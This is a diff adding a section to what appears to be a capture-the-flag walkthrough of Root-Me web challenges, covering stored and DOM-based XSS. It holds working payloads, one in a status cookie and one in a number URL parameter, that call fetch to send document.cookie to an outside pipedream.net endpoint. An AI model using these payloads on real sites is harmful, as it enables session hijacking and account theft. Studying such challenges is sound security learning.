@@ -17,3 +17,18 @@ Change this value into `admin` and try posting a message, this change will affec
 So we're going to exploit this.
 
 Change `status` cookie into `"><script>fetch("URL?c="+document.cookie)</script>` and post a message
+
+### XSS DOM Based - Introduction
+
+Submit a random number, we will see url has a param `number`. 
+
+Ctrl + U to view source code. `number` variable get value from URL param.
+
+Exploit this.
+
+Submit number `'; fetch("https://eo944ovuf06595y.m.pipedream.net?c="+document.cookie)//`. 
+
+This will break `''` of `number` variable, add `fetch` into script.
+
+Submit URL in `Contact` page with param `RootmeURL?number='; fetch("https://eo944ovuf06595y.m.pipedream.net?c="+document.cookie)//`
+
